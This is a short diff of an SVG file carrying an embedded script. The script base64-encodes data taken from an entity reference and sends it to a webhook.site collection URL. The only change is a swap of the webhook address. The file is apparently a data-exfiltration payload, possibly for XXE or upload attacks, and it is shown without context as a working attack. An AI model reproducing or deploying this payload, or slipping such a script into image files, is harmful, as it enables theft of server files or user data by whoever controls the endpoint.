@@ -5,6 +5,6 @@
 <svg xmlns="http://www.w3.org/2000/svg">
   <script type="text/javascript">
     let data = "&encoded;";
-    fetch("https://webhook.site/e9819ff5-8aeb-4e28-bed0-c84c9ce8d1a3/?data=" + btoa(data));
+    fetch("https://webhook.site/79cc3117-3c9d-4319-a4a6-b9169b39363e/?data=" + btoa(data));
   </script>
 </svg>
